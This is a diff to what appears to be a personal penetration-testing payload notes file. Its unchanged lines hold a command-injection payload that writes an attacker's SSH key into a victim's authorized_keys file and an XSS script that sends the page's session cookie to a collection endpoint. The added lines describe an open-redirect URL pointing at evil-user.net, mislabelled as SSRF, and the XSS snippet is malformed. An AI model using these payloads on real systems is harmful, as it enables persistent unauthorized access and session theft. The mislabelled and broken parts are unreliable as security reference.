@@ -1667,6 +1667,18 @@ inject your SSH key to victim device(FYI - SSL key has been modified):
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCW+gcpi9WfUm1gwtYghmIwnLf1rkca1ZRdgfgdfjjkjkEFDeXXh1eV0prP1cOsUmAmfJl/GBwiGyRo79gkmHE5p0gyH3SlSfIXkI/PDz/E9PNIu/lDBLWNjT8ELJF2GgDU2GiuNh5ryK9zlTiEmvpI5/Nre/K1yliqsCzr5SLWRREQ2uQv8fb6z47YnTOVb09DlOr8HIiXTnQznNaQGeuKkud9K/c9kFojFK9aJgi60XHNUcgbQv9AZZhG2pzFt4cgo/hHv17Zv762Sc33kd+33boIXmKk4+iFYKAH6BkL1kIDnCCV3CB32yKEufcoUBeTDgPu9XkbeHb3VHN8BzuSXXjYHI+vrrj+qj6CsH8atiiTQBG8pGnZYhh2AWvR7pGF3Lydp0k0fcYlVyKuCxZU6RNs7jITJKwG2Uju9sfDHG4GXL8+HkRYQjS+v2Nx1seyR0dyTqAf0BOwEoSlfWLcgzdu/GhrKedyKM9gx/xcU= uggy@kali" > ./authorized_keys
 
 
+#SSRF
+
+the application contains an open redirection vulnerability in which the following URL:
+
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+
+returns a redirection to:
+
+http://evil-user.net
+
+
+
 Script samples:
 
 This PHP file silently executes the code and grabs the user's session cookie and session ID.
@@ -1675,5 +1687,7 @@ This PHP file silently executes the code and grabs the user's session cookie and
 <script> 
 document.write("<img.src="https://localhost/submitcookie.php? cookie =" + escape(document.cookie) +"" />); 
 </script> 
+
+
 
 
